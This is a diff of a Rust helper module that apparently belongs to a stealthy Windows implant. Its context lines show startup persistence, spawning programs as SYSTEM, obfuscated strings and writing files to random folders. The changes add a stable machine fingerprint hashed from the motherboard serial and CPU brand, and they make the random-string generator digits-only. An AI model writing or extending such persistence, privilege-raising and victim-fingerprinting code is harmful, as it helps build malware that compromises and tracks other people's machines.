@@ -5,6 +5,7 @@ use std::{
     process::{ Command, Output },
     time::Duration,
 };
+use sysinfo::{ System, RefreshKind, CpuRefreshKind };
 use anyhow::{ Context, Result };
 use obfstr::obfstr as s;
 use rand::{ distributions::Alphanumeric, Rng };
@@ -41,10 +42,8 @@ pub fn add_to_startup_global(name: &str, exe_location: String) -> Result<()> {
     Ok(())
 }
 pub fn generate_random_string(length: usize) -> String {
-    let random_string = (0..length)
-        .map(|_| rand::thread_rng().sample(Alphanumeric) as char)
-        .collect();
-
+    let mut rng = rand::thread_rng();
+    let random_string: String = rng.gen::<u64>().to_string().chars().take(length).collect();
     random_string
 }
 
@@ -107,14 +106,16 @@ pub fn try_spawn_program_as_system(program: &str, args: Option<&str>) -> Result<
     Ok(())
 }
 
-pub fn get_motherboard_serial_number() -> Result<String> {
-    let output = call_program(s!("wmic"), Some(s!("baseboard get serialnumber")))?;
+pub fn try_get_motherboard_serial_number() -> String {
+    if let Ok(output) = call_program(s!("wmic"), Some(s!("baseboard get serialnumber"))) {
+        let output_str = String::from_utf8_lossy(&output.stdout);
+        let lines: Vec<&str> = output_str.split('\n').collect();
+        let serial_number = lines[1].trim();
 
-    let output_str = String::from_utf8_lossy(&output.stdout);
-    let lines: Vec<&str> = output_str.split('\n').collect();
-    let serial_number = lines[1].trim();
-
-    Ok(serial_number.to_owned())
+        serial_number.to_owned()
+    } else {
+        String::new()
+    }
 }
 
 pub fn is_running_from_system32() -> bool {
@@ -152,4 +153,17 @@ pub fn write_file_to_random_folder(file_name: &str, bytes: &[u8]) -> Result<Path
 pub fn write_bytes_to_file(file_path: PathBuf, bytes: &[u8]) -> Result<()> {
     std::fs::write(file_path, bytes)?;
     Ok(())
+}
+pub fn fetch_constant_device_id() -> String {
+    let combined = format!("{}{}", try_get_motherboard_serial_number(), get_cpu_brand());
+    let digest = md5::compute(combined.as_bytes());
+    let constant_id = format!("{:x}", digest);
+    constant_id
+}
+pub fn get_cpu_brand() -> String {
+    let sys = System::new_with_specifics(
+        RefreshKind::nothing().with_cpu(CpuRefreshKind::everything())
+    );
+    let cpu_brand = sys.cpus()[0].brand().to_owned();
+    cpu_brand
 }
